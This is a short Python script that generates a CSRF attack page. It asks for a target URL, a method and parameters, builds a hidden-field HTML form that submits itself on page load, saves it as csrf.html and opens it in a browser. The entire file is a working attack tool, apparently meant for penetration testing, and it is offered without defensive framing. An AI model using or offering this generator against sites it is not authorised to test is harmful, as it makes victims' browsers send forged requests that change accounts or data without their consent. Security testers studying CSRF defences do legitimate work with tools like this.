import os
import webbrowser as bro

action_url = input("Action url: ")
method = input("Action method: ")
params = input("String source: ")
json = input("Is JSON? [Y/N]: ")

html = ""
html += "<html><body>\n\r<form action=\"{}\" method=\"{}\">".format(action_url, method)

if json != "Y":
        params = params.split("&")
        for x in range(len(params)):
                html += "\r\r<input type=\"hidden\" name=\"{}\" value=\"{}\">".format(params[x].split("=")[0], params[x].split("=")[1])
else:
        html += '\r\r<input type="hidden" name="{0}" value="{0}">'.format(params.replace('\"', '\\"'))

html += "\r</form>\n\r<script>document.forms[0].submit()</script>"
html += "</body></html>"

with open("csrf.html", "w") as file:
        file.write(html)
        bro.open(os.path.abspath(file.name))
